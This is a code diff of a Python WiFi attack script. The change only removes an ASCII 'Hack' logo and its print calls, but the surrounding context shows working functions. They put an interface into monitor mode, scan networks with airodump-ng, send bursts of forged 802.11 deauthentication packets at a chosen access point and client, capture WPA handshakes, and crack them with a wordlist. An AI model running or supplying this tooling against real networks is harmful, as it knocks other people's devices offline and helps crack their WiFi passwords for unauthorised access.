@@ -4,28 +4,10 @@ import argparse
 from scapy.all import *
 import time
 
-# ASCII Art Logo
-logo = """
- _    _            _    
-| |  | |          | |   
-| |__| | __ _  ___| | __
-|  __  |/ _` |/ __| |/ /
-| |  | | (_| | (__|   < 
-|_|  |_|\__,_|\___|_|\_\
-"""
-
-def print_logo():
-    """
-    Prints the ASCII logo.
-    """
-    print(logo)
-    print("=" * 70)
-
 def switch_mode(interface, mode):
     """
     Switches the network interface to the specified mode (monitor/managed).
     """
-    print_logo()
     if mode not in ['monitor', 'managed']:
         print(f"[-] Invalid mode: {mode}. Choose 'monitor' or 'managed'.")
         return
@@ -40,7 +22,6 @@ def scan_networks(interface):
     """
     Scans for available WiFi networks.
     """
-    print_logo()
     print(f"[+] Scanning for WiFi networks on interface {interface}")
     subprocess.call(['airodump-ng', interface])
 
@@ -48,7 +29,6 @@ def deauth_attack(interface, target_bssid, client_mac):
     """
     Performs a deauthentication attack on the specified target.
     """
-    print_logo()
     print(f"[+] Performing deauth attack on {target_bssid} targeting client {client_mac}")
     packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
     sendp(packet, iface=interface, count=100, inter=0.1)
@@ -57,7 +37,6 @@ def sniff_handshake(interface, output_file):
     """
     Sniffs for a WPA handshake on the specified network interface.
     """
-    print_logo()
     def packet_handler(pkt):
         if pkt.haslayer(EAPOL):
             print("[+] WPA Handshake Captured")
@@ -71,7 +50,6 @@ def crack_wpa_handshake(handshake_file, wordlist_file):
     """
     Cracks the WPA handshake using the specified wordlist.
     """
-    print_logo()
     if not os.path.exists(handshake_file):
         print(f"Handshake file {handshake_file} not found!")
         return
